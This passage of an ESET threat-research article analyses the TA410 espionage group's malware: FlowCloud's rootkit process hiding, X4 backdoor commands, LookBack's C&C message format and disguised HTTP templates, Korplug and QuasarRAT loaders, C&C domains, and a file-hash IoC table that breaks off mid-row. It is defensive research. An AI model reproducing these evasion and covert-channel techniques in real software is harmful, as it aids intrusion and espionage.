<p>The rootkit can prevent processes from being shown by utilities that list running processes, such as Task Manager. As shown in Figure 17, it achieves this by removing their entries from the <span style="font-family: 'courier new', courier, monospace;">ActiveProcessLinks</span> list of the undocumented <span style="font-family: 'courier new', courier, monospace;">KPROCESS</span> kernel structure. Since this structure is not part of the public API and can change between releases, the rootkit contains code to match the operating system’s build number to the correct offsets in this structure. That code covers all versions from Windows XP to Windows 10 20H1. This functionality can be invoked on any process via the <span style="font-family: 'courier new', courier, monospace;">IOCTL_HIDE_PROCESS_BY_PROCESSID</span> (<span style="font-family: 'courier new', courier, monospace;">0x222028</span>) control code. It is also used, on driver startup, to hide the process with the PID contained in the registry key <span style="font-family: 'courier new', courier, monospace;">HKLM\HARDWARE\{76BA14B7-AF0C-4dc9-9E9D-2A6970F231D9}</span>. This process is further camouflaged by changing its associated executable filename to one of <span style="font-family: 'courier new', courier, monospace;">svchost.exe</span> or <span style="font-family: 'courier new', courier, monospace;">dllhost.exe</span> in the same kernel structure.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2022/04/Figure-17.-Function-used-to-prevent-a-process-from-being-displayed-in-lists-of-running-processes.png"><img class="wp-image-161832" src="https://web-assets.esetstatic.com/wls/2022/04/Figure-17.-Function-used-to-prevent-a-process-from-being-displayed-in-lists-of-running-processes.png" alt="" width="800" height="493" /></a><p class="caption-text"><em>Figure 17. Function used to prevent a process from being displayed in lists of running processes</em></p></div></p>
<p>Through its hijacking of the network driver, the rootkit can also hide a single process’s network traffic from local utilities. The process whose traffic is to be hidden is set through the <span style="font-family: 'courier new', courier, monospace;">IOCTL_SET_TRAFFICHIDE_PROCESSID</span> (<span style="font-family: 'courier new', courier, monospace;">0x222048</span>) control code.</p>
<p>Some of the rootkit’s functions are used by the <span style="font-family: 'courier new', courier, monospace;">fcClientDll</span> module to hide the process in which it is running.</p>
<p>Control codes to manipulate a process name in various internal structures are also exposed by the driver.</p>
<h4><em><strong>Persistence module (</strong></em><strong><span style="font-family: 'courier new', courier, monospace;">fcClientWD</span></strong><em><strong>)</strong></em></h4>
<p>This module is relatively simple compared to other components. The previously mentioned <span style="font-family: 'courier new', courier, monospace;">NetTask</span> already accomplishes persistence in most cases, by executing on system startup. This module complements that mechanism by ensuring persistence in a very specific edge case where execution of the malware might be interrupted: the user logs out on a system with hibernation and Fastboot enabled. On systems where either of those is disabled, this module does nothing.</p>
<h4><em><strong>FlowCloud v4.1.3</strong></em></h4>
<p>This older version of FlowCloud has already been described in a <a href="https://www.proofpoint.com/us/blog/threat-insight/flowcloud-version-413-malware-analysis" target="_blank" rel="noopener"><em>Proofpoint blogpost</em></a> and presents similarities to the newer version described in the preceding subsections, so we will only highlight notable differences and new information revealed by our analysis.</p>
<p>This version runs multiple anti-analysis and anti-detection checks before executing its payload, and terminates if any of those tests detect that the process is being analyzed. It checks running processes for executables of several known cybersecurity vendors. While most of these names are also present in version 5, this list is not a strict subset of the one v.5 uses. This tends to support the proposition that versions 4 and 5 of FlowCloud are maintained in parallel.</p>
<p>It also embeds a DLL version of the <a href="https://github.com/a0rtega/pafish" target="_blank" rel="noopener"><em>Pafish</em></a> (aka Paranoid Fish) sandbox and analysis detection tool as one of its encrypted resources. This library is loaded in memory and all of the anti-analysis/anti-sandboxing checks it implements are run.</p>
<p>Interestingly, the driver installed is the same as the one for version 5.0.2. Those used by version 5.0.3 provide identical functionality, but differ slightly.</p>
<h3>TA410 – LookingFrog</h3>
<p>LookingFrog uses two main malware families: X4 and LookBack. We have seen both of them on machines belonging to the same victim.</p>
<h4><em><strong>X4</strong></em></h4>
<p>X4 is a custom backdoor that is used as a first stage, before LookBack is deployed. It is loaded by a VMProtect-ed loader, usually named <span style="font-family: 'courier new', courier, monospace;">PortableDeviceApi.dll</span> or <span style="font-family: 'courier new', courier, monospace;">WptsExtensions.dll</span>. Unfortunately, we were not able to uncover any persistence method.</p>
<p>The loader injects an orchestrator into memory in a<span style="font-family: 'courier new', courier, monospace;"> svchost.exe</span> process. In turn, the orchestrator injects the network component into memory and communicates with it via a file located at <span style="font-family: 'courier new', courier, monospace;">C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\Log\rsa.txt</span>. Figure 18 shows a summary of the X4 components.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2022/04/Figure-18.-Summary-of-the-X4-components.png"><img class="wp-image-161833" src="https://web-assets.esetstatic.com/wls/2022/04/Figure-18.-Summary-of-the-X4-components.png" alt="" width="800" height="424" /></a><p class="caption-text"><em>Figure 18. Summary of the X4 components</em></p></div></p>
<p>The network component is shellcode. It is encrypted using the AES algorithm and stored in the Windows registry. Table 2 shows the three registry keys used by X4.</p>
<p style="text-align: center;"><em>Table 2. Network shellcode registry keys</em></p>
<p><table>
<thead>
<tr>
<th>Registry Key</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><span style="font-family: courier new, courier, monospace;">HKLM\SOFTWARE\Microsoft\DRM\X4Key</span></td>
<td>AES key.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">HKLM\SOFTWARE\Microsoft\DRM\PSKey</span></td>
<td>Name of the process into which the shellcode will be injected (<span style="font-family: courier new, courier, monospace;">spoolsv.exe</span>).</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">HKLM\SOFTWARE\Microsoft\DRM\X4Data</span></td>
<td>Encrypted shellcode.</td>
</tr>
</tbody>
</table></p>
<p>The decrypted shellcode looks like it was based on Metasploit and communicates with a hardcoded IP address via HTTP. An interesting characteristic is that it uses the fake <span style="font-family: 'courier new', courier, monospace;">Host</span> header <span style="font-family: 'courier new', courier, monospace;">onedrive.live.com</span>.</p>
<p>Every second, the orchestrator, which lives in memory only, reads the cleartext <span style="font-family: 'courier new', courier, monospace;">rsa.txt</span> file to check whether there are new commands to execute. The commands are received from the C&amp;C server, via the network shellcode. In the orchestrator, the commands are identified by a numerical identifier that is computed from the command name, as shown in Figure 19.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2022/04/Figure-19.-Custom-hash-function-seen-in-X4.png"><img class="wp-image-161834 size-full" src="https://web-assets.esetstatic.com/wls/2022/04/Figure-19.-Custom-hash-function-seen-in-X4.png" alt="" width="626" height="125" /></a><p class="caption-text"><em>Figure 19. Custom hash function seen in X4</em></p></div></p>
<p>The orchestrator handles seven commands, detailed in Table 3. Output of these commands is written to <span style="font-family: 'courier new', courier, monospace;">C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\Log\output.log</span>.</p>
<p style="text-align: center;"><em>Table 3. X4 backdoor commands</em></p>
<p><table>
<thead>
<tr>
<th>ID</th>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><span style="font-family: courier new, courier, monospace;">0x3ECFF9B9D92</span></td>
<td><span style="font-family: courier new, courier, monospace;">osload</span></td>
<td>Write new encrypted shellcode to  <span style="font-family: courier new, courier, monospace;">HKLM\SOFTWARE\Microsoft\DRM\X4Data</span>. It can also modify <span style="font-family: courier new, courier, monospace;">X4Key</span> and <span style="font-family: courier new, courier, monospace;">PSKey</span>.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">0x3F5FAFC0EDD</span></td>
<td><span style="font-family: courier new, courier, monospace;">pskill</span></td>
<td>Kill a process by PID.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">0x3F5FB1E6015</span></td>
<td><span style="font-family: courier new, courier, monospace;">pslist</span></td>
<td>List the running processes using  <span style="font-family: courier new, courier, monospace;">CreateToolhelp32Snapshot</span> and  <span style="font-family: courier new, courier, monospace;">Process32Next</span>.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">0x3B6C27610D1</span></td>
<td><span style="font-family: courier new, courier, monospace;">inject</span></td>
<td>Decrypt and inject shellcode, from encrypted form on disk, into memory.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">0xDA83E71</span></td>
<td><span style="font-family: courier new, courier, monospace;">exec</span></td>
<td>Execute a given command line.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">0xE9478DC</span></td>
<td><span style="font-family: courier new, courier, monospace;">live</span></td>
<td>Get the PID of the process in which the orchestrator is running.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">0x6D6E70D40</span></td>
<td><span style="font-family: courier new, courier, monospace;">cacls</span></td>
<td>Modify the access controls of a given object using  <span style="font-family: courier new, courier, monospace;">SetEntriesInAclA</span>,  <span style="font-family: courier new, courier, monospace;">SetNamedSecurityInfoA,</span> and  <span style="font-family: courier new, courier, monospace;">BuildExplicitAccessWithName</span>.</td>
</tr>
</tbody>
</table></p>
<p>X4 provides basic functionalities to control the machine remotely, but it lacks more advanced spying capabilities.</p>
<h3><em>LookBack</em></h3>
<p>The LookBack backdoor has previously been described by <a href="https://www.proofpoint.com/us/threat-insight/post/lookback-malware-targets-united-states-utilities-sector-phishing-attacks"><em>Proofpoint</em></a>; we are therefore providing a quick summary and our analysis of the custom network protocol.</p>
<h4><em><strong>Backdoor</strong></em></h4>
<p>In all samples we observed, the LookBack loader is a legitimate version of<span style="font-family: 'courier new', courier, monospace;"> libcurl.dll</span> with the <span style="font-family: 'courier new', courier, monospace;">curl_share_init</span> (ordinal #52) export modified to load the SodomNormal communications module. This corroborates the observation by <a href="https://www.proofpoint.com/us/threat-insight/post/lookback-malware-targets-united-states-utilities-sector-phishing-attacks"><em>Proofpoint</em></a> researchers. This module is embedded in the library’s resource section and encrypted with an algorithm similar to RC4. The encryption/decryption function, shown in Figure 20, always uses the same key.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2022/04/Figure-20.-Decompiled-view-of-the-function-used-to-encrypt-and-decrypt-the-embedded-module.png"><img class="wp-image-161835" src="https://web-assets.esetstatic.com/wls/2022/04/Figure-20.-Decompiled-view-of-the-function-used-to-encrypt-and-decrypt-the-embedded-module.png" alt="" width="800" height="619" /></a><p class="caption-text"><em>Figure 20. Decompiled view of the function used to encrypt and decrypt the embedded module</em></p></div></p>
<p>The SodomNormal component tries to read configuration information from a <span style="font-family: 'courier new', courier, monospace;">sodom.ini</span> file. This configuration file is encrypted using the just-described function and starts with the magic bytes <span style="font-family: 'courier new', courier, monospace;">0xAF1324BC</span>. If this file is unavailable or invalid, a hardcoded default configuration is used.</p>
<p>A unique victim ID is then generated from the victim’s CPUID, username, and IP address. This is sent to the server along with the computer’s name and the configuration data. The communications module then downloads the main backdoor module, named SodomMain, from the C&amp;C server. Unfortunately, we couldn’t obtain this module.</p>
<h4><strong><em>Communication protocol</em></strong></h4>
<p>LookBack can communicate over HTTP or via its “normal protocol”. In either case, the data being transferred is the same.</p>
<p>LookBack’s normal protocol uses raw TCP sockets and a custom message format described in Table 4. This message is composed of eight header fields, followed by a body of variable length. The message body is encrypted with the function previously described for the SodomNormal resource in the loader (Figure 20). The encrypted data is then compressed with the deflate algorithm via the <span style="font-family: 'courier new', courier, monospace;">compress</span> function of the statically linked zlib.</p>
<p style="text-align: center;"><em>Table 4. LookBack message format</em></p>
<p><table>
<thead>
<tr>
<th>Field</th>
<th>Offset&nbsp;(bytes)</th>
<th>Note</th>
</tr>
</thead>
<tbody>
<tr>
<td>Magic bytes</td>
<td><span style="font-family: courier new, courier, monospace;">0x00</span></td>
<td>The constant <span style="font-family: courier new, courier, monospace;">0x48AB2EC2</span>. Messages that don’t start with this magic value are discarded.</td>
</tr>
<tr>
<td>&lt;Message dependent&gt;</td>
<td><span style="font-family: courier new, courier, monospace;">0x04</span></td>
<td></td>
</tr>
<tr>
<td>Compressed&nbsp;body&nbsp;size</td>
<td><span style="font-family: courier new, courier, monospace;">0x08</span></td>
<td></td>
</tr>
<tr>
<td>Uncompressed&nbsp;body&nbsp;size</td>
<td><span style="font-family: courier new, courier, monospace;">0x0C</span></td>
<td></td>
</tr>
<tr>
<td>Checksum</td>
<td><span style="font-family: courier new, courier, monospace;">0x10</span></td>
<td>CRC32 of the message body.</td>
</tr>
<tr>
<td>Message type</td>
<td><span style="font-family: courier new, courier, monospace;">0x14</span></td>
<td>Integer value indicating the message’s content and the associated action to be performed.<br />
We have found code for over 50 message types. There seems to be little to no overlap between the values used by the client and the server. Table 5 presents the types we have analyzed in more depth.</td>
</tr>
<tr>
<td>&lt;Message dependent&gt;</td>
<td><span style="font-family: courier new, courier, monospace;">0x18</span></td>
<td></td>
</tr>
<tr>
<td>&lt;Message dependent&gt;</td>
<td><span style="font-family: courier new, courier, monospace;">0x1C</span></td>
<td></td>
</tr>
<tr>
<td>Message Body</td>
<td><span style="font-family: courier new, courier, monospace;">0x20</span></td>
<td>The message body can be empty. In this case, the checksum and length fields are set to  <span style="font-family: courier new, courier, monospace;">0x00</span>.</td>
</tr>
</tbody>
</table></p>
<p style="text-align: center;"><em>Table 5. LookBack message types</em></p>
<p><table>
<thead>
<tr>
<th>Message type</th>
<th>Used by</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>2</strong></td>
<td>Client</td>
<td>Register with C&C server. The body contains configuration and information about the victim host.</td>
</tr>
<tr>
<td><strong>3</strong></td>
<td>Server</td>
<td>Acknowledgment for message type 2.</td>
</tr>
<tr>
<td><strong>8</strong></td>
<td>Client</td>
<td>Request to download the main backdoor component (SodomMain).</td>
</tr>
<tr>
<td><strong>9</strong></td>
<td>Server</td>
<td>Reply to message type 8. The message body contains the SodomMain file.</td>
</tr>
<tr>
<td><strong>36</strong>  and  <strong>38</strong></td>
<td>Client</td>
<td>Transfer file to server in message body.</td>
</tr>
<tr>
<td><strong>35</strong>  and  <strong>37</strong></td>
<td>Server</td>
<td>Response to message 36 or 38.</td>
</tr>
<tr>
<td><strong>41</strong></td>
<td>Client</td>
<td>Request file from server.</td>
</tr>
<tr>
<td><strong>42</strong></td>
<td>Server</td>
<td>Transfer file to client in message body (response to message 41)</td>
</tr>
</tbody>
</table></p>
<p>The HTTP protocol uses the message format detailed in the previous paragraph, but it adds a few extra steps to disguise its traffic as legitimate HTTP. It uses a pair of hardcoded templates, one for client requests and another for server responses. The fields required for HTTP, such as content length, address, and port number, are filled in with the correct values; useless data is used for the others.</p>
<p>For client requests, the messages are encoded with a modified hexadecimal algorithm that uses the encoding alphabet <span style="font-family: 'courier new', courier, monospace;">a-p</span> instead of the conventional <span style="font-family: 'courier new', courier, monospace;">0-9a-f</span>. This provides some obfuscation and ensures that messages will not contain binary data or be obviously hex encoded, both of which could look suspicious in an <span style="font-family: 'courier new', courier, monospace;">application/x-www-form-urlencoded</span> message. The request’s body is composed of this encoded value prefixed with the hardcoded string <span style="font-family: 'courier new', courier, monospace;">id=1&amp;op=report&amp;status=</span>. Client request and server response templates are shown in Figure 21 and Figure 22 respectively, with the template fields in angle brackets.</p>
<pre class="language-bash" title=""><code>POST &lt;C&amp;C address + port&gt;/status.php?r=&lt;epoch timestamp&gt;&lt;random 16-bit int&gt; HTTP/1.1
Accept: text/html, application/xhtml+xml, */*
Accept-Language: en-us
User-Agent: &lt;return value of ObtainUserAgentString OR "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"&gt;
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Host: &lt;C&amp;C url&gt;
Content-Length: &lt;content length&gt;
Connection: Keep-Alive
Cache-Control: no-cache

id=1&amp;op=report&amp;status=&lt;encoded LookBack message&gt;
</code></pre>
<p><em>Figure 21. Template used for HTTP client requests</em></p>
<p>On the server side, the data described in the previous section is sent directly as binary data in the body with a header that purports that the data is a GIF image.</p>
<pre class="language-bash" title=""><code>HTTP/1.1 200 OK
Server: nginx/1.12.2
Date: &lt;current time&gt; GMT
Last-Modified: &lt;current time - 100 seconds&gt; GMT
ETag: &lt;3 random 16-bit ints&gt;
Accept-Ranges: bytes
Content-Length: &lt;content length&gt;
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: image/gif

&lt;LookBack message&gt;</code></pre>
<p><em>Figure 22. Template used for HTTP server responses</em></p>
<h3>TA410 – JollyFrog</h3>
<p>This third team uses off-the-shelf malware from the known malware families QuasarRAT and Korplug (aka PlugX). JollyFrog mostly aligns with what was described <a href="https://www.fortinet.com/blog/threat-research/uncovering-new-activity-by-apt-"><em>by Fortinet as APT10</em></a>.</p>
<h4><em><strong>Korplug</strong></em></h4>
<p>Korplug, also known as <a href="https://attack.mitre.org/software/S0013/"><em>PlugX</em></a>, is a backdoor that has been used for years by many different cyberespionage groups. Despite being well known, it is still in use and we have observed TA410 using it as recently as in April 2021.</p>
<p>In the case of TA410, Korplug arrives as a RARSFX archive, generally named <span style="font-family: 'courier new', courier, monospace;">m.exe</span>, containing three files:</p>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">qrt.dll</span>: A custom loader.</li>
<li><span style="font-family: 'courier new', courier, monospace;">qrtfix.exe</span>: A legitimate signed application from F-Secure, vulnerable to DLL search-order hijacking.</li>
<li><span style="font-family: 'courier new', courier, monospace;">qrt.dll.usb</span>: The Korplug shellcode.</li>
</ul>
<p>The loader allocates memory using <span style="font-family: 'courier new', courier, monospace;">VirtualAlloc</span> and copies the content of <span style="font-family: 'courier new', courier, monospace;">qrt.dll.usb</span> there. Then it jumps right into the shellcode that will decompress and load the Korplug payload.</p>
<h4><strong><em>QuasarRAT</em></strong></h4>
<p>QuasarRAT is a full-featured backdoor freely available on <a href="https://github.com/quasar/Quasar" target="_blank" rel="noopener"><em>GitHub</em></a>. It is used by numerous threat actors who perform cyberespionage or cybercrime.</p>
<p>TA410 uses a custom downloader and a custom loader written in .NET, which are convenient for identifying their instances of QuasarRAT among all the noise created by other attackers.</p>
<p>Named <span style="font-family: 'courier new', courier, monospace;">sll.exe</span>, this downloader is digitally signed with the certificate seen in Figure 23. The certificate is likely stolen and belongs to 北京和赢讯时科技有限公司 (translated: Beijing Heyingxunshi Technology Co., Ltd.) with thumbprint <span style="font-family: 'courier new', courier, monospace;">850821D88A4475F0310F10FBA806353A4113D252</span>. Although the certificate has now been revoked, it was still valid when this sample was signed on August 10<sup>th</sup>, 2020.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2022/04/Figure-23.-Digital-signature-of-the-QuasarRAT-downloader.png"><img class="wp-image-161836" src="https://web-assets.esetstatic.com/wls/2022/04/Figure-23.-Digital-signature-of-the-QuasarRAT-downloader.png" alt="" width="500" height="581" /></a><p class="caption-text"><em>Figure 23. Digital signature of the QuasarRAT downloader</em></p></div></p>
<p>This downloader simply downloads the loader and encrypted QuasarRAT payload from the hardcoded C&amp;C server <span style="font-family: 'courier new', courier, monospace;">http://ffca.caibi379[.]com, at /rwjh/new/</span>. This server was previously <a href="https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new" target="_blank" rel="noopener"><em>linked to FlowCloud</em></a> (FlowingFrog). The loader is named <span style="font-family: 'courier new', courier, monospace;">PresentationCache.exe</span> and is protected with <a href="http://www.dnguard.net" target="_blank" rel="noopener"><em>DNGuard</em></a>, a commercial .NET packer. It is also signed with the same certificate as the downloader. It decrypts and loads the final QuasarRAT payload, which uses <span style="font-family: 'courier new', courier, monospace;">cahe.microsofts[.]org</span> as its C&amp;C server.</p>
<h2>Conclusion</h2>
<p>TA410 is a cyberespionage umbrella targeting high-profile entities such as governments and universities worldwide. ESET is revealing its latest findings about this group, including results from ongoing  research, during <a href="https://www.botconf.eu/" target="_blank" rel="noopener"><em>Botconf 2022</em></a>.</p>
<p>Initial access to targets is obtained by exploiting vulnerable internet-facing applications such as Microsoft Exchange, or by sending spearphishing emails with malicious attachments such as RTF documents created via the Royal Road builder. Even though the JollyFrog team uses generic tools, FlowingFrog and LookingFrog have access to complex implants such as FlowCloud and LookBack. YARA and Snort rules for these implants are available <a href="https://github.com/eset/malware-ioc" target="_blank" rel="noopener"><em>in ESET's GitHub repository</em></a>.</p>
<span class="update-block"><p><em>For any inquiries about our research published on WeLiveSecurity, please contact us at <a href="mailto:threatintel@eset.com">threatintel@eset.com</a>.</em>
<br /><em>ESET Research now also offers private APT intelligence reports and data feeds. For any inquiries about this service, visit the <a href="https://www.eset.com/int/business/services/threat-intelligence/" target="_blank" rel="noopener">ESET Threat Intelligence</a> page.</em></p></span>
<h2>IoCs</h2>
<h3>Files</h3>
<p><table>
<thead>
<tr>
<th>SHA-1</th>
<th>Filename</th>
<th>Detection</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><span style="font-family: courier new, courier, monospace;">C96558312FBF5847351B0B6F724D7B3A31CCAF03</span></td>
<td>N/A</td>
<td>Win32/Agent.UWR</td>
<td>FlowCloud v5.0.3 initial loader.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">1403241C415A8D686B1148FA4229A2EB833D8D08</span></td>
<td><span style="font-family: courier new, courier, monospace;">setlangloc.dll</span></td>
<td>Win32/Agent.UNL</td>
<td>FlowCloud DLL hijacking malicious library.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">38D0E92AFF991CFC9C68D7BAAD6CB85916139AF5</span></td>
<td><span style="font-family: courier new, courier, monospace;">hidmouse.sys</span></td>
<td>Win32/Agent.UKR</td>
<td>TA410 32-bit Rootkit/Keylogger driver.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">AF978ED8AD37CE1437A6B42D96BF518D5C4CFD19</span></td>
<td><span style="font-family: courier new, courier, monospace;">hidmouse.sys</span></td>
<td>Win64/Agent.UKR</td>
<td>TA410 64-bit Rootkit/Keylogger driver.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">B70F3A3A9B5B8506EE95791469CA496E01AD7DAF</span></td>
<td><span style="font-family: courier new, courier, monospace;">winver32.dll</span></td>
<td>Win32/Agent.ULH</td>
<td><nobr>FlowCloud v4.1.3 hcClientLoaderZero_x86 backdoor.</nobr></td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">014421BDB1EA105A6DF0C27FC114819FF3637704</span></td>
<td><span style="font-family: courier new, courier, monospace;">hhh.exe</span></td>
<td>Win32/Agent.ABYK</td>
<td>FlowCloud v4.1.3 initial loader.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">EA298866E5A61FEEA4D062987F23B10A78C8A4CA</span></td>
<td>N/A</td>
<td>Win32/Agent.ULH</td>
<td>FlowCloud v4.1.3 backdoor.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">021B9E2E8AA30B29569254C0378A9F43E4F32EEC</span></td>
<td><span style="font-family: courier new, courier, monospace;">winver64.dll</span></td>
<td>Win64/Agent.KM</td>
<td><nobr>FlowCloud v4.1.3 hcClientLoaderZero_x64 backdoor.</nobr></td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">2A2F08FAD6B0A86DC94885224687D954E739CC21</span></td>
<td>N/A</td>
<td>Win32/ParanoidFish.A</td>
<td>Pafish sandbox detection tool.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">3658B7CCA13C8C8AD03E9B6AEFE4B9CBE48E3C81</span></td>
<td><span style="font-family: courier new, courier, monospace;">hidmouse.sys</span></td>
<td>Win64/Agent.UKR</td>
<td>TA410 Rootkit/Keylogger driver.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">517488F6BD0E7FC9EDE82F37226A75212B277E21</span></td>
<td><span style="font-family: courier new, courier, monospace;">hidmouse.sys</span></td>
<td>Win64/Agent.UKR</td>
<td>TA410 Rootkit/Keylogger driver.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">C05B4AD7A3322917E17710842FB88A090198D51F</span></td>
<td>N/A</td>
<td>Win32/Agent.TWI</td>
<td>LookBack trojanized libcurl loader.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">DB2DF1BDF8145CB8ABA3A2026A3CC3EF4F1762BE</span></td>
<td><span style="font-family: courier new, courier, monospace;">phx.dll</span></td>
<td>Win32/Agent.TWI</td>
<td>LookBack trojanized libcurl loader.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">EDE2AB811311FC011B1E89C5A0B7A60C123B7398</span></td>
<td><span style="font-family: courier new, courier, monospace;">hidmouse.sys</span></td>
<td>Win64/Agent.UKR</td>
<td>TA410 Rootkit/Keylogger driver.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">7AA35BA7030AFCD271436DE8173D7B2F317A1BFC</span></td>
<td><span style="font-family: courier new, courier, monospace;">libcurl.dll</span></td>
<td>Win32/Agent.TWI</td>
<td>LookBack trojanized libcurl loader.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">A5C02ABE698300F3DE0B7CC7F0856652753831DA</span></td>
<td><span style="font-family: courier new, courier, monospace;">libcurl.dll</span></td>
<td>Win32/Agent.TWI</td>
<td>LookBack trojanized libcurl loader.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">613C4AFAE8F5F80F22DCD1827E3230FCA361ADA5</span></td>
<td><span style="font-family: courier new, courier, monospace;">libcurl.dll</span></td>
<td>Win32/Agent.UKD</td>
<td>LookBack trojanized libcurl loader.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">859CD6DFDADAB3D6427C6C1C29581CB2094D648F</span></td>
<td><span style="font-family: courier new, courier, monospace;">meterpreter.exe</span></td>
<td>Win32/Rozena.CP</td>
<td>Metasploit Meterpreter backdoor.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">DBEA7F0C0D2BF8BC365A2D1572CA1538FE8FB9A3</span></td>
<td><span style="font-family: courier new, courier, monospace;">responsor.dat</span></td>
<td>Win32/Agent.ULL</td>
<td>FlowCloud  <span style="font-family: courier new, courier, monospace;">fcClientDLL</span>  final stage backdoor.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">ADD5B4FD9AEA6A38B5A8941286BC9AA4FE23BD20</span></td>
<td><span style="font-family: courier new, courier, monospace;">絆邧坋蔡趕口昴.doc</span>  </td>
<td>Win32/Exploit.Agent.TY</td>
<td>Malicious Royal Road document.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">7BA42061568FF6D9CA5FE5360DCE74C25EA48ADA</span></td>
<td>N/A</td>
<td>Win32/Agent.ACKQ</td>
<td>Packed Tendyron downloader.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">D81215890703C48B8EA07A1F50FEC1A6CA9DF88B</span></td>
<td>N/A</td>
<td>Win32/TrojanDownloader.Agent.FLI</td>
<td>Unpacked Tendyron downloader.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">F359D3C074135BBCA9A4C98A6B6544690EDAE93D</span></td>
<td><span style="font-family: courier new, courier, monospace;">OnKeyToken_KEB.dll</span></td>
<td>Win32/Injector.ELGA</td>
<td>Tendyron malicious DLL.  </td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">621B31D5778EC2FB72D38FB61CED110A6844D094</span></td>
<td>N/A</td>
<td>Win64/Rozena.AO</td>
<td>X4 network shellcode.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">BC11DC8D86A457A07CFE46B5F2EF6598B83C8A1F</span></td>
<td><span style="font-family: courier new, courier, monospace;">m.exe</span></td>
<td>Win32/Injector.EMVA</td>
<td>Korplug dropper.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">C369E1466F66744AA0E658588E7CF2C051EE842F</span></td>
<td><span style="font-family: courier new, courier, monospace;">qrt.dll</span></td>
<td>Win32/Injector.EMVA</td>
<td>Korplug loader.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">B868764C46BADC152667E9128375BA4F8D936559</span></td>
<td><span style="font-family: courier new, courier, monospace;">qrt.dll.usb</span></td>
<td>N/A</td>
<td>Korplug encrypted payload.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">BDECA89B4F39E6702CE6CBBC9E6D69F6BBAB01C8</span></td>
<td>N/A</td>
<td>N/A</td>
<td>Korplug decrypted payload.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">5379FBB0E02694C524463FDF7F267A7361ECDD68</span></td>
<td><span style="font-family: courier new, courier, monospace;">sll.exe</span></td>
<td>MSIL/TrojanDownloader.Agent.GPS</td>
<td>QuasarRAT downloader.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">6CC6170977327541F8185288BB9B1B81F56D3FD0</span></td>
<td><span style="font-family: courier new, courier, monospace;">PresentationCache.exe</span></td>
<td>MSIL/Agent.TZG</td>
<td>QuasarRAT loader.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">D95185A4A3F8512D92F69D2ED7B8743638C54BE8</span></td>
<td>N/A</td>
<td>MSIL/Spy.Agent.AES</td>
<td>QuasarRAT backdoor.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">BE7F0E41CD514561AED43B07AA9F5F0842BF876C</span></td>
<td><span style="font-family: courier new, courier, monospace;">HTra.exe</span></td>
<td>Win32/HackTool.Hucline.AB</td>
<td>HUC Packet Transmitter (HTran).</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">7F663F50E9D6376715AEB3AB66DEDE038258EF6C</span></td>
<td><span style="font-family: courier new, courier, monospace;">HTran13.exe</span></td>
<td>Win32/HackTool.Hucline.S</td>
<td>HUC Packet Transmitter (HTran).</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">BEDA1224B3BB9F98F95FF7757D2687F4D9F4B53A</span></td>
<td><span style="font-family: courier new, courier, monospace;">event.exe</span></td>
